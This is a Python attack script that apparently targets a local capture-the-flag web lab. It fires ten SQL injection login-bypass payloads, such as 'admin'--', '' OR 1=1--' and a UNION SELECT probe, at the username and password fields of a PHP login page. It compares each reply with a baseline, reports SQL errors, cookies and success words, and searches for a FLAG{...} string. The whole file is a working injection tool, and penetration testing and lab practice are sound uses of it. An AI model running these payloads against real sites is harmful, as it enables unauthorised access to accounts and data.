import requests
import re
from urllib.parse import urljoin

# Target URL
base_url = "http://127.0.0.1:32888"
login_url = urljoin(base_url, "/index.php")

# SQL injection payloads to test
payloads = [
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "admin' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "1' OR '1'='1",
    "admin'or 1=1 or '1'='1"
]

# Get baseline response (normal failed login)
print("[*] Getting baseline response...")
baseline_data = {
    'username': 'normaluser',
    'password': 'normalpass'
}
baseline_resp = requests.post(login_url, data=baseline_data, allow_redirects=False)
baseline_status = baseline_resp.status_code
baseline_length = len(baseline_resp.text)
baseline_has_cookie = bool(baseline_resp.cookies)

print(f"[+] Baseline - Status: {baseline_status} | Length: {baseline_length}B | Has Cookie: {baseline_has_cookie}")
print(f"[+] Baseline Response:\n{baseline_resp.text}\n")

# Track interesting results
interesting_results = []

# Test each payload in username field
print("=" * 80)
print("[*] Testing payloads in USERNAME field (password='test')...")
print("=" * 80)

for i, payload in enumerate(payloads, 1):
    test_data = {
        'username': payload,
        'password': 'test'
    }
    
    try:
        resp = requests.post(login_url, data=test_data, allow_redirects=False, timeout=10)
        status = resp.status_code
        length = len(resp.text)
        has_cookie = bool(resp.cookies)
        
        # Check for differences from baseline
        is_different = (
            status != baseline_status or 
            abs(length - baseline_length) > 10 or  # Allow small variance
            has_cookie != baseline_has_cookie
        )
        
        # Check for success indicators
        success_indicators = ['welcome', 'dashboard', 'logged in', 'success']
        has_success = any(indicator in resp.text.lower() for indicator in success_indicators)
        
        # Check for SQL errors
        sql_errors = ['sql', 'mysql', 'syntax', 'error in your sql', 'mysqli', 'query']
        has_sql_error = any(error in resp.text.lower() for error in sql_errors)
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
        
        # Print result
        indicator = "[!]" if (is_different or has_success or has_sql_error or flag_match) else "[-]"
        print(f"\n{indicator} Payload #{i}: {payload}")
        print(f"    Status: {status} | Length: {length}B | Cookie: {has_cookie}")
        
        if is_different:
            print(f"    [ANOMALY] Different from baseline (Δ={length-baseline_length}B)")
        if has_success:
            print(f"    [SUCCESS] Success indicator found in response")
        if has_sql_error:
            print(f"    [SQL ERROR] SQL error message detected")
        if flag_match:
            print(f"    [FLAG FOUND] {flag_match.group()}")
        if resp.cookies:
            print(f"    [COOKIES] {dict(resp.cookies)}")
        
        # Store interesting results
        if is_different or has_success or has_sql_error or flag_match:
            interesting_results.append({
                'field': 'username',
                'payload': payload,
                'status': status,
                'length': length,
                'response': resp.text,
                'cookies': dict(resp.cookies) if resp.cookies else None,
                'flag': flag_match.group() if flag_match else None
            })
            print(f"    Response preview (first 500 chars):\n    {resp.text[:500]}")
    
    except requests.exceptions.Timeout:
        print(f"\n[TIMEOUT] Payload #{i}: {payload}")
    except Exception as e:
        print(f"\n[ERROR] Payload #{i}: {payload} - {str(e)}")

# Test each payload in password field
print("\n" + "=" * 80)
print("[*] Testing payloads in PASSWORD field (username='admin')...")
print("=" * 80)

for i, payload in enumerate(payloads, 1):
    test_data = {
        'username': 'admin',
        'password': payload
    }
    
    try:
        resp = requests.post(login_url, data=test_data, allow_redirects=False, timeout=10)
        status = resp.status_code
        length = len(resp.text)
        has_cookie = bool(resp.cookies)
        
        # Check for differences from baseline
        is_different = (
            status != baseline_status or 
            abs(length - baseline_length) > 10 or
            has_cookie != baseline_has_cookie
        )
        
        # Check for success indicators
        success_indicators = ['welcome', 'dashboard', 'logged in', 'success']
        has_success = any(indicator in resp.text.lower() for indicator in success_indicators)
        
        # Check for SQL errors
        sql_errors = ['sql', 'mysql', 'syntax', 'error in your sql', 'mysqli', 'query']
        has_sql_error = any(error in resp.text.lower() for error in sql_errors)
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
        
        # Print result
        indicator = "[!]" if (is_different or has_success or has_sql_error or flag_match) else "[-]"
        print(f"\n{indicator} Payload #{i}: {payload}")
        print(f"    Status: {status} | Length: {length}B | Cookie: {has_cookie}")
        
        if is_different:
            print(f"    [ANOMALY] Different from baseline (Δ={length-baseline_length}B)")
        if has_success:
            print(f"    [SUCCESS] Success indicator found in response")
        if has_sql_error:
            print(f"    [SQL ERROR] SQL error message detected")
        if flag_match:
            print(f"    [FLAG FOUND] {flag_match.group()}")
        if resp.cookies:
            print(f"    [COOKIES] {dict(resp.cookies)}")
        
        # Store interesting results
        if is_different or has_success or has_sql_error or flag_match:
            interesting_results.append({
                'field': 'password',
                'payload': payload,
                'status': status,
                'length': length,
                'response': resp.text,
                'cookies': dict(resp.cookies) if resp.cookies else None,
                'flag': flag_match.group() if flag_match else None
            })
            print(f"    Response preview (first 500 chars):\n    {resp.text[:500]}")
    
    except requests.exceptions.Timeout:
        print(f"\n[TIMEOUT] Payload #{i}: {payload}")
    except Exception as e:
        print(f"\n[ERROR] Payload #{i}: {payload} - {str(e)}")

# Print summary
print("\n" + "=" * 80)
print("[SUMMARY] Interesting Results")
print("=" * 80)

if not interesting_results:
    print("[*] No anomalies detected. All payloads produced baseline response.")
else:
    print(f"[+] Found {len(interesting_results)} payload(s) with different behavior:\n")
    
    for result in interesting_results:
        print(f"Field: {result['field']}")
        print(f"Payload: {result['payload']}")
        print(f"Status: {result['status']} | Length: {result['length']}B")
        if result['cookies']:
            print(f"Cookies: {result['cookies']}")
        if result['flag']:
            print(f"FLAG: {result['flag']}")
        print(f"\nFull Response:\n{result['response']}")
        print("-" * 80)

